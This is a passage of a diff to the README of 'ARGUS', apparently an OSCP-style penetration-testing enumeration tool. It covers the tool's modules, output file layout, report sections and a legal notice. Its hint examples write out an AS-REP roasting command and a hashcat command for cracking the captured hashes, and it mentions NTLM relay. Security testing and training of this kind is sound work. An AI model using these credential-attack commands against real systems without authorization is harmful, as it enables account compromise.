+| **SVC** | `SVC` | `services_enum.sh` | 1 | SSH banner grab and authentication method enumeration (ssh-audit); Nmap service scripts for SSH, Telnet, MSRPC, SNMP, IMAP, POP3, RDP; onesixtyone SNMP community string sweep; snmpwalk network interface OID walk (dual-homed detection); generic banner grabs for non-standard ports |
+| **RMT** | `RMT` | `remote_enum.sh` | 2 | RDP (3389): Nmap rdp-enum-encryption, NLA detection, CVE-2019-0708 BlueKeep version check; WinRM (5985/5986): version fingerprint and authentication method; VNC port detection and version probe |
 
 ---
 
-## OSCP Compliance Rules
+## Output Structure
 
-| Rule | Enforcement |
-|------|-------------|
-| **No brute-force** | Hydra/Medusa appear only as `💡 [MANUAL]` hints |
-| **No exploitation** | Redis write-primitive, xp_cmdshell, NFS SUID plant → `[MANUAL]` only |
-| **No autopwn** | Engine stops at enumeration; no Metasploit; no shellcode |
-| **Full transparency** | Every command printed with `[CMD]` prefix before execution |
-| **User controls scope** | Ctrl+C skips current tool → continues; double Ctrl+C exits |
-| **Credential safety** | `--user`/`--pass` used only for authenticated enumeration, never spraying |
-| **Clean output** | Every finding logged to `notes.md` in real time — exam evidence ready |
+All output is written under `output/targets/<IP>/` (configurable with `--output-dir`):
+
+```
+output/targets/10.10.10.5/
+│
+├── session.json          ← Persistent state: ports, domain, users, module status
+├── notes.md              ← Structured Markdown report, updated after every module
+├── users.txt             ← All discovered usernames, auto-updated
+├── domain.txt            ← Discovered domain name, read by subsequent wrappers
+├── session.jsonl         ← Structured JSON Lines audit log
+│
+├── scans/
+│   ├── allports.txt          ← Fast TCP scan — all 65535 ports
+│   ├── open_ports.txt        ← Comma-separated open TCP port list
+│   ├── udp.txt               ← UDP top-100 scan
+│   ├── open_ports_udp.txt    ← Comma-separated open UDP ports
+│   ├── targeted.nmap         ← Deep -sC -sV -O scan (human-readable)
+│   ├── targeted.xml          ← Deep scan XML (parsed by Python engine)
+│   ├── nmap_initial.xml      ← Copy used by port parser
+│   ├── ttl.txt               ← Raw TTL value from ping
+│   ├── vulns.txt             ← NSE vuln+auth scan (background)
+│   └── vulns.pid             ← PID of background vuln scan
+│
+├── smb/
+│   ├── nmap_smb.txt           ← Nmap SMB NSE scripts
+│   ├── enum4linux.txt         ← enum4linux-ng output
+│   ├── smbmap_null.txt        ← Null session share map
+│   ├── smbmap_null_recursive.txt
+│   ├── smbclient.txt          ← Share list
+│   ├── rpcclient.txt          ← User/group enumeration
+│   ├── nxc_shares.txt         ← nxc share listing
+│   ├── nxc_rid_brute.txt      ← RID cycling output
+│   ├── users_rpc.txt          ← Consolidated user list
+│   └── spider_<SHARE>.txt     ← Per-share file tree
+│
+├── ldap/
+│   ├── ldap_nmap.txt          ← Nmap LDAP scripts
+│   ├── ldapsearch_base.txt    ← Naming context discovery
+│   ├── ldapsearch_full.txt    ← Full anonymous dump
+│   ├── ldap_users.txt         ← Extracted sAMAccountName list
+│   ├── ldap_computers.txt     ← Computer accounts
+│   ├── ldap_groups.txt        ← Group names
+│   ├── ldap_descriptions.txt  ← Accounts with Description fields
+│   ├── ldap_spns.txt          ← Kerberoastable SPNs
+│   ├── windapsearch_users.txt
+│   ├── windapsearch_privusers.txt
+│   ├── kerbrute_users.txt     ← Raw kerbrute output
+│   ├── valid_users.txt        ← Confirmed Kerberos usernames
+│   └── asrep_candidates.txt   ← Accounts without pre-auth
+│
+├── web/
+│   ├── headers_<port>.txt     ← HTTP response headers
+│   ├── whatweb_<port>.txt     ← Technology fingerprint
+│   ├── gobuster_<port>.txt    ← Directory brute-force
+│   ├── feroxbuster_<port>.txt ← Recursive directory scan
+│   ├── nikto_<port>.txt       ← Nikto vulnerability scan
+│   ├── sslscan_<port>.txt     ← TLS/SSL enumeration
+│   └── wpscan_<port>.txt      ← WordPress scan (if detected)
+│
+├── ftp/                       ← FTP banner, NSE, directory tree
+├── db/                        ← Per-engine NSE and CLI output
+├── mail/ smtp/                ← SMTP/POP3/IMAP enumeration
+├── nfs/                       ← rpcinfo, showmount, NSE
+├── network/                   ← traceroute, ARP sweep, PTR lookups
+├── remote/                    ← RDP/WinRM/VNC enumeration
+└── loot/                      ← Files downloaded from shares or FTP
+```
+
+### notes.md structure
+
+The report is written after every module and fully rebuilt at session end. Sections include:
+
+| Section | Content |
+|---------|---------|
+| **Target Overview** | IP, domain, OS guess, scan date, services table |
+| **Vulnerabilities & Critical Findings** | CVE matches, signing disabled, no_root_squash, unauthenticated access |
+| **Confirmed Access & Anonymous Sessions** | Anonymous FTP/SMB, null sessions, Redis ping |
+| **Enumeration Discoveries** | Shares, users, web paths, SAN hostnames, DNS entries |
+| **OSCP Manual Checklist** | Per-port action items with copy-paste commands |
+| **Manual Follow-Up Commands** | All `[MANUAL]` hints from every module as `- [ ]` checklist items |
+| **Session Timeline** | Full timestamped log of every finding |
+| **Arsenal Recommender** | OS-appropriate PrivEsc, file transfer, and post-shell survival kit |
 
 ---
 
-*OSCP Enumeration Framework — by acanoman*
+## Manual Hints
+
+ARGUS never executes attack-adjacent commands. When a module detects a condition that
+warrants further action, it emits a `[MANUAL]` hint. These appear in two places:
+
+1. **TUI hints panel** (press `H` to show/hide) — live during the scan
+2. **`notes.md`** under "Manual Follow-Up Commands" — persistent in the report
+
+### Example — LDAP → AS-REP Roast hint
+
+When kerbrute confirms valid usernames and Kerberos port 88 is open:
+
+```
+[MANUAL] AS-REP Roasting — run manually after enumeration:
+    impacket-GetNPUsers CORP/ \
+        -usersfile /path/to/valid_users.txt \
+        -no-pass \
+        -dc-ip 10.10.10.5 \
+        -format hashcat \
+        -outputfile ldap/asrep_hashes.txt
+
+    # Crack captured hashes:
+    hashcat -m 18200 ldap/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
+        -r /usr/share/john/rules/best64.rule
+```
+
+### Example — SMB → NTLM relay hint
+
+When SMB signing disabled is detected:
+
+```
+[MANUAL] NTLM Relay (requires separate interface + authorization):
+    Responder + ntlmrelayx must be run manually after reviewing scope.
+    Do NOT automate relay attacks.
+```
+
+The operator reads each hint, reviews the discovered evidence, and decides whether to
+run the command. ARGUS has already done the enumeration — the decision to act is always
+the operator's.
+
+---
+
+## Legal & Ethics
+
+This tool is intended for **authorized penetration testing only**.
+
+Always obtain written permission before running any enumeration or attack tools against
+a target. Running ARGUS against systems you do not own or do not have explicit written
+authorization to test is illegal in most jurisdictions.
+
+The author is not responsible for misuse. Use responsibly and ethically.
+
+---
+
+## Author
+
+☠ by **acanoman** ☠
+
+---
+
+*ARGUS Enumeration Framework — Assisted recon. Never autopwn.*
